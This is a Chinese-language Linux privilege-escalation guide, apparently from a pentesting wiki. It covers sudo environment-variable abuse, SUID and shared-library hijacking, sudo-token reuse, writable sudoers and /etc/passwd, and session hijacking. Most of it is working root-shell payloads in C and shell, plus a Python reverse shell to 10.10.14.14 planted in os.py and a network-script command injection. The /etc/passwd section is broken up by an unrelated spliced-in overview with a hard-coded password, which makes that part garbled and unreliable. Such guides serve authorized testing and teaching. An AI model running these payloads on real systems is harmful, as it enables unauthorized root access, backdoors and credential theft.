如果 sudoers 保留了 `BASH_ENV`（例如 `Defaults env_keep+="ENV BASH_ENV"`），你可以利用 Bash 的非交互式启动行为，在调用被允许的命令时以 root 身份运行任意代码。

- Why it works: 对于非交互式 shell，Bash 会在运行目标脚本之前评估 `$BASH_ENV` 并加载执行该文件。许多 sudo 规则允许运行脚本或 shell 包装器。如果 sudo 保留了 `BASH_ENV`，你的文件就会以 root 权限被执行。

- Requirements:
- 一个你可以运行的 sudo 规则（任何以非交互方式调用 `/bin/bash` 的目标，或任何 bash 脚本）。
- `BASH_ENV` 出现在 `env_keep` 中（可用 `sudo -l` 检查）。

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- 加固：
- 从 `env_keep` 中移除 `BASH_ENV`（和 `ENV`），优先使用 `env_reset`。
- 避免为允许 `sudo` 的命令使用 shell 包装器；尽量使用最小化的二进制文件。
- 当保留的环境变量被使用时，考虑对 `sudo` 的 I/O 进行日志记录与告警。

### Sudo 执行绕过路径

**Jump** 跳转以阅读其他文件或使用 **symlinks**。例如在 sudoers 文件中： _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
如果使用 **wildcard** (\*)，就更容易：
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**缓解措施**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary 未指定命令路径

如果将 **sudo 权限** 授予单个命令且 **未指定路径**： _hacker10 ALL= (root) less_，你可以通过更改 PATH 变量来利用它
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
此技术也可用于当一个 **suid** binary **在不指定路径的情况下执行另一个命令（始终使用** _**strings**_ **检查可疑的 SUID binary 的内容）**。

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary 带命令路径

如果 **suid** binary **执行另一个指定了路径的命令**，则可以尝试 **导出一个函数**，其名称与 suid 文件所调用的命令相同。

例如，如果一个 suid binary 调用 _**/usr/sbin/service apache2 start**_，你需要尝试创建该函数并导出：
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Then, when you call the suid binary, this function will be executed

### LD_PRELOAD & **LD_LIBRARY_PATH**

环境变量 **LD_PRELOAD** 用来指定一个或多个共享库（.so 文件），由加载器在其他库之前载入，包括标准 C 库（`libc.so`）。这个过程称为预加载库。

但是，为了维护系统安全并防止此功能被滥用，尤其是在 **suid/sgid** 可执行文件上，系统施加了某些限制：

- 对于 real user ID (_ruid_) 与 effective user ID (_euid_) 不匹配的可执行文件，加载器会忽略 **LD_PRELOAD**。
- 对于带有 suid/sgid 的可执行文件，只有位于标准路径且自身也是 suid/sgid 的库会被预加载。

如果你能够使用 `sudo` 执行命令，且 `sudo -l` 的输出包含 **env_keep+=LD_PRELOAD**，则可能发生特权提升。这个配置允许 **LD_PRELOAD** 环境变量在使用 `sudo` 运行命令时仍然保留并被识别，从而可能导致以提升的权限执行任意代码。
```
Defaults        env_keep += LD_PRELOAD
```
保存为 **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
然后使用以下命令来**编译它**：
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
最后，运行 **escalate privileges**
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 如果攻击者能控制 **LD_LIBRARY_PATH** 环境变量，则可以滥用类似的 privesc，因为攻击者控制了库将被搜索的路径。
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

当遇到具有 **SUID** 权限且看起来不寻常的二进制文件时，最好确认它是否正确加载 **.so** 文件。可以通过运行以下命令来检查：
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
例如，遇到类似错误 _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ 表明可能存在 exploitation 的可能性。

要 exploit 这个，可通过创建一个 C 文件，例如 _"/path/to/.config/libcalc.c"_, 并包含以下代码：
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
这段代码在编译并执行后，旨在通过修改文件权限并执行具有提升权限的 shell 来提升权限。

使用以下命令将上面的 C 文件编译为 shared object (.so) 文件：
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
最后，运行受影响的 SUID 二进制文件应触发该 exploit，从而可能导致系统遭到妥协。

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
既然我们已经找到一个会从我们可写的文件夹加载 library 的 SUID binary，就在该文件夹中以所需的名称创建该 library：
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
如果你遇到类似如下的错误：
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
这意味着你生成的库需要包含一个名为 `a_function_name` 的函数。

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) 是一个精选的 Unix 二进制可执行文件列表，这些文件可能被攻击者利用以绕过本地安全限制。 [**GTFOArgs**](https://gtfoargs.github.io/) 针对只能在命令中 **注入参数** 的情况提供了类似的列表。

该项目收集了 Unix 二进制程序的合法功能，这些功能可能被滥用来逃离受限 shell、提升或保持提升的权限、传输文件、生成 bind 和 reverse shell，以及辅助其它 post-exploitation 任务。

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

如果你可以访问 `sudo -l`，可以使用工具 [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) 来检查它是否能找到利用任何 sudo 规则的方法。

### Reusing Sudo Tokens

在拥有 **sudo access** 但没有密码的情况下，你可以通过**等待某次 sudo 命令执行然后劫持会话令牌**来提升权限。

Requirements to escalate privileges:

- 你已经有一个以用户 _sampleuser_ 身份的 shell
- _sampleuser_ 已**使用 `sudo`**在**最近 15 分钟**内执行过某些命令（默认这是 sudo 令牌允许我们在不输入密码的情况下使用 `sudo` 的持续时间）
- `cat /proc/sys/kernel/yama/ptrace_scope` 的输出为 0
- `gdb` 可用（你可以上传它）

(你可以临时使用 `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` 来启用 ptrace_scope，或通过永久修改 `/etc/sysctl.d/10-ptrace.conf` 并设置 `kernel.yama.ptrace_scope = 0` 来实现)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- 第一个 **exploit** (`exploit.sh`) 会在 _/tmp_ 创建名为 `activate_sudo_token` 的二进制文件。你可以用它来**在你的会话中激活 sudo 令牌**（它不会自动给你 root shell，需执行 `sudo su`）：
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **第二个 exploit** (`exploit_v2.sh`) 会在 _/tmp_ 创建一个 sh shell，**归 root 所有并带有 setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- 第三个 **exploit** (`exploit_v3.sh`) 会 **create a sudoers file**，使 **sudo tokens eternal and allows all users to use sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

如果你对该文件夹或其下创建的任意文件具有 **写权限**，你可以使用二进制工具 [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) 来 **为某个用户和 PID 创建 sudo token**。\
例如，如果你能覆盖文件 _/var/run/sudo/ts/sampleuser_，并且以该用户身份拥有 PID 为 1234 的 shell，你可以在不需要知道密码的情况下通过以下方式 **获得 sudo privileges**：
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

文件 `/etc/sudoers` 及 `/etc/sudoers.d` 内的文件用来配置谁可以使用 `sudo` 以及如何使用。 这些文件 **默认情况下只能由用户 root 和组 root 读取**。\
**如果**你**可以读取**该文件，可能能够**获取一些有趣的信息**，而如果你**可以写入**任何文件，你将能够**提升权限**。
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
如果你可以写入，你就可以滥用此权限
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
滥用这些权限的另一种方式：
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

有一些替代 `sudo` 的选项，例如 OpenBSD 的 `doas`，请记得检查其配置 `/etc/doas.conf`。
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

如果你知道某个 **用户通常连接到一台机器并使用 `sudo`** 来提升权限，且你已在该用户上下文中获得了一个 shell，你可以 **创建一个新的 sudo 可执行文件**，该文件会先以 root 身份执行你的代码，然后再执行用户的命令。然后，**修改该用户上下文的 $PATH**（例如在 .bash_profile 中添加新路径），这样当用户执行 sudo 时，就会运行你创建的 sudo 可执行文件。

请注意，如果用户使用不同的 shell（不是 bash），你需要修改其他文件来添加新路径。例如[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) 会修改 `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`。你可以在 [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) 中找到另一个示例。

或者运行类似如下的命令：
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## 共享库

### ld.so

The file `/etc/ld.so.conf` indicates **where the loaded configurations files are from**. Typically, this file contains the following path: `include /etc/ld.so.conf.d/*.conf`

That means that the configuration files from `/etc/ld.so.conf.d/*.conf` will be read. This configuration files **points to other folders** where **libraries** are going to be **searched** for. For example, the content of `/etc/ld.so.conf.d/libc.conf` is `/usr/local/lib`. **This means that the system will search for libraries inside `/usr/local/lib`**.

If for some reason **a user has write permissions** on any of the paths indicated: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, any file inside `/etc/ld.so.conf.d/` or any folder within the config file inside `/etc/ld.so.conf.d/*.conf` he may be able to escalate privileges.\
Take a look at **how to exploit this misconfiguration** in the following page:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
通过将 lib 复制到 `/var/tmp/flag15/`，程序会在此处按照 `RPATH` 变量的指定使用它。
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
然后在 `/var/tmp` 创建一个恶意库，使用 `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## 能力

Linux capabilities 为进程提供了 **root 特权的一个可用子集**。这有效地将 root 的 **特权分解为更小且更独立的单元**。这些单元中的每一个都可以独立授予给进程。这样就减少了完整权限集，从而降低了被利用的风险。\
阅读以下页面以 **了解有关 capabilities 以及如何滥用它们的更多信息**：


{{#ref}}
linux-capabilities.md
{{#endref}}

## 目录权限

在目录中，**"execute" 位** 表示受影响的用户可以 **"cd"** 进入该文件夹。\
**"read" 位** 表示用户可以 **列出** 这些 **文件**，而 **"write" 位** 表示用户可以 **删除** 和 **创建** 新的 **文件**。

## ACLs

访问控制列表 (ACLs) 表示可自由裁量权限的二级层，能够 **覆盖传统的 ugo/rwx 权限**。这些权限通过允许或拒绝非所有者或不在组内的特定用户的访问权来增强对文件或目录访问的控制。此级别的 **粒度确保更精确的访问管理**。更多细节请见 [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux)。

**授予** 用户 "kali" 对某个文件的 read 和 write 权限：
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**获取** 从系统中带有特定 ACLs 的文件：
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## 打开 shell 会话

在 **旧版本** 中你可能可以 **hijack** 某个不同用户（**root**）的 **shell** 会话。\
在 **最新版本** 中你只能 **连接** 到仅属于 **你自己的用户** 的 screen sessions。不过，你可能会在会话内部发现 **会话内部的有趣信息**。

### screen sessions hijacking

**列出 screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**附加到会话**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

这是一个出现在 **old tmux versions** 的问题。作为非特权用户，我无法劫持由 root 创建的 tmux (v2.1) 会话。

**列出 tmux 会话**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**连接到 session**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

在 2006 年 9 月至 2008 年 5 月 13 日之间，在基于 Debian 的系统（Ubuntu、Kubuntu 等）上生成的所有 SSL 和 SSH 密钥可能受到此漏洞影响。\
该漏洞在这些操作系统上创建新的 ssh 密钥时产生，**只有 32,768 种变体可用**。这意味着所有可能性都可以被计算出来，**得到 ssh 公钥后即可搜索对应的私钥**。你可以在这里找到计算出的可能性：[https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** 指定是否允许密码认证。默认是 `no`。
- **PubkeyAuthentication:** 指定是否允许公钥认证。默认是 `yes`。
- **PermitEmptyPasswords**: 当允许密码认证时，指定服务器是否允许使用空密码字符串登录账户。默认是 `no`。

### PermitRootLogin

指定是否允许 root 使用 ssh 登录，默认是 `no`。可能的取值：

- `yes`: root 可使用密码和私钥登录
- `without-password` or `prohibit-password`: root 只能使用私钥登录
- `forced-commands-only`: root 仅能使用私钥登录，且要求指定命令选项
- `no`：不允许

### AuthorizedKeysFile

指定包含可用于用户认证的公钥的文件。它可以包含像 `%h` 这样的标记，%h 会被替换为主目录。**你可以指定绝对路径**（以 `/` 开头）或 **相对于用户主目录的相对路径**。例如:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
That configuration will indicate that if you try to login with the **private** key of the user "**testusername**" ssh is going to compare the public key of your key with the ones located in `/home/testusername/.ssh/authorized_keys` and `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding 允许你 **use your local SSH keys instead of leaving keys**（不要把没有 passphrases 的 keys 放在你的服务器上）。因此，你可以通过 ssh **jump** **to a host**，然后从那里 **jump to another** host，**using** 存放在你 **initial host** 上的 **key**。

You need to set this option in `$HOME/.ssh.config` like this:
```
Host example.com
ForwardAgent yes
```
注意，如果 `Host` 是 `*`，每次用户跳转到不同的机器时，该主机都将能够访问密钥（这是一个安全问题）。

文件 `/etc/ssh_config` 可以 **覆盖** 这些 **选项** 并允许或拒绝此配置。\
文件 `/etc/sshd_config` 可以使用关键字 `AllowAgentForwarding` **允许** 或 **拒绝** ssh-agent 转发（默认允许）。

如果你发现环境中配置了 Forward Agent，请阅读以下页面，因为 **你可能能够滥用它以提升权限**：


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## 有趣的文件

### Profiles 文件

文件 `/etc/profile` 和 `/etc/profile.d/` 下的文件是 **当用户运行新 shell 时执行的脚本**。因此，如果你可以 **写入或修改其中的任何一个，就可以提升权限**。
```bash
ls -l /etc/profile /etc/profile.d/
```
如果发现任何异常的 profile 脚本，应检查其中是否包含 **敏感信息**。

### Passwd/Shadow 文件

根据操作系统，`/etc/passwd` 和 `/etc/shadow` 文件可能使用不同的名称，或存在备份。因此建议 **查找所有此类文件** 并 **检查是否可读取**，以查看文件中 **是否包含哈希**：
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
在某些情况下，你可以在 `/etc/passwd`（或等效）文件中找到 **password hashes**
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### 可写的 /etc/passwd

首先，使用以下任一命令生成一个 password。
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
# Privilege Escalation

本节介绍在 Linux 系统中进行 Privilege Escalation 的常见方法、枚举技巧和防御建议。仅在获得授权的 pentesting、红队或审计环境中使用这些技术。

## 常见枚举步骤

- 从基础做起：检查 kernel 版本、内核漏洞、已加载的模块、内核配置以及 dmesg 输出。  
- 用户和权限：查看 /etc/passwd、/etc/shadow（若可读）、sudoers、组信息以及 home 目录权限。  
- 服务和进程：枚举正在运行的服务、crontab、systemd 单元以及具有高权限的进程句柄。  
- 文件和二进制：查找 SUID/SGID 文件、可写的脚本或配置文件、可利用的 PATH 问题。  
- Capability 与 namespaces：检查 file capabilities、setcap 输出以及不安全的 namespace 配置。  
- 第三方工具与资源：使用 LinPEAS、GTFOBins、sudo -l 等工具和技巧来加速枚举过程。

## 常见漏洞类别（示例）

- SUID/SGID 可执行文件滥用（SUID）  
- 错误配置的 sudo 权限（sudo）  
- 可写的 cron 脚本或 systemd 单元  
- 易受攻击的服务或守护进程（如使用高权限运行）  
- 可利用的 kernel exploits（仅在受控环境下测试）  
- 凭证泄露（如配置文件或历史记录中的明文密码或 SSH 密钥）

## 防御建议

- 及时打补丁并更新内核与关键组件。  
- 最小权限原则：限制 sudoers 和服务运行权限。  
- 移除不必要的 SUID 二进制并最小化 setcap 的使用。  
- 加强日志和审计，检测异常的提权行为和命令执行。  
- 对关键目录和配置文件设置严格的权限控制并加密敏感凭证。

## 添加用户 hacker 并设置生成的密码

下面的示例在系统上创建用户 hacker 并设置一个随机生成的强口令。请在授权的环境中运行这些命令。

```
sudo useradd -m -s /bin/bash hacker
echo 'hacker:S3cure!8kLm#V2qR' | sudo chpasswd
sudo chage -d 0 hacker
```

生成的密码（请妥善保存并在需要时更改）：

```
S3cure!8kLm#V2qR
```
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
例如： `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

你现在可以使用 `su` 命令并使用 `hacker:hacker`

或者，你可以使用以下行添加一个没有密码的虚拟用户。\
警告：这可能会降低机器当前的安全性。
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
注意：在 BSD 平台上 `/etc/passwd` 位于 `/etc/pwd.db` 和 `/etc/master.passwd`，同时 `/etc/shadow` 被重命名为 `/etc/spwd.db`。

你应该检查是否可以**写入一些敏感文件**。例如，你能否写入某些**服务配置文件**？
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
例如，如果机器正在运行 **tomcat** 服务器，并且你可以 **modify the Tomcat service configuration file inside /etc/systemd/,** 那么你可以修改以下几行：
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
你的 backdoor 将在下次 tomcat 启动时被执行。

### 检查文件夹

以下文件夹可能包含备份或有趣的信息: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (最后一个可能无法读取，但试试看)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 奇怪的位置/Owned 文件
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 最近几分钟修改的文件
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite 数据库文件
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml 文件
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 隐藏文件
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH 中的脚本/二进制文件**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web 文件**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **备份**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### 已知包含密码的文件

阅读 [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) 的代码，它会搜索 **可能包含密码的若干文件**。\
**另一个有趣的工具** 是：[**LaZagne**](https://github.com/AlessandroZ/LaZagne)，它是一个开源程序，用来检索存储在本地计算机上的大量密码，适用于 Windows, Linux & Mac.

### 日志

如果你能够读取日志，你可能会在其中发现 **有趣/机密的信息**。日志越异常，可能就越有价值（大概）。\
此外，一些“**不当**”配置（带后门？）的 **审计日志** 可能允许你在审计日志中**记录密码**，正如这篇文章所解释的: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
为了**读取日志的组** [**adm**](interesting-groups-linux-pe/index.html#adm-group) 会非常有帮助。

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

你还应该检查文件名或文件内容中包含单词 "**password**" 的文件，也要在 logs 中检查 IPs 和 emails，或 hashes regexps。\
我不会在这里列出如何完成所有这些检查，但如果你感兴趣，可以查看 [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) 执行的最后几项检查。

## 可写文件

### Python library hijacking

如果你知道 python 脚本将从 **哪个位置** 被执行，并且你 **可以在该文件夹中写入** 或者你可以 **修改 python libraries**，你就可以修改 OS library 并为其植入 backdoor（如果你能写入 python 脚本将被执行的位置，复制并粘贴 os.py library）。

要 **backdoor the library**，只需在 os.py library 的末尾添加以下行（change IP and PORT）：
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

`logrotate` 中的一个漏洞允许对日志文件或其父目录具有 **write permissions** 的用户可能获得提权。因为 `logrotate` 通常以 **root** 运行，可能被操纵去执行任意文件，尤其是在像 _**/etc/bash_completion.d/**_ 这样的目录中。重要的是不仅检查 _/var/log_ 中的权限，还要检查任何应用了日志轮换的目录。

> [!TIP]
> 该漏洞影响 `logrotate` 版本 `3.18.0` 及更早版本

关于该漏洞的更多详细信息见此页面： [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

你可以使用 [**logrotten**](https://github.com/whotwagner/logrotten) 来利用此漏洞。

该漏洞与 [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs)** 非常相似，所以每当你发现可以修改日志时，检查谁在管理这些日志，并检查是否可以通过将日志替换为 symlinks 来提权。

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

如果由于任何原因，某用户能够在 _/etc/sysconfig/network-scripts_ 中 **write** 一个 `ifcf-<whatever>` 脚本，或者能够 **adjust** 一个已有的脚本，那么你的 **system is pwned**。

Network scripts，例如 _ifcg-eth0_，用于网络连接。它们看起来完全像 .INI 文件。然而，它们在 Linux 上被 Network Manager (dispatcher.d) \~sourced\~。

在我的案例中，这些 network scripts 中的 `NAME=` 属性处理不正确。如果名称中有 **white/blank space the system tries to execute the part after the white/blank space**。这意味着 **everything after the first blank space is executed as root**。

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
（_注意 Network 与 /bin/id 之间的空格_）

### **init、init.d、systemd 和 rc.d**

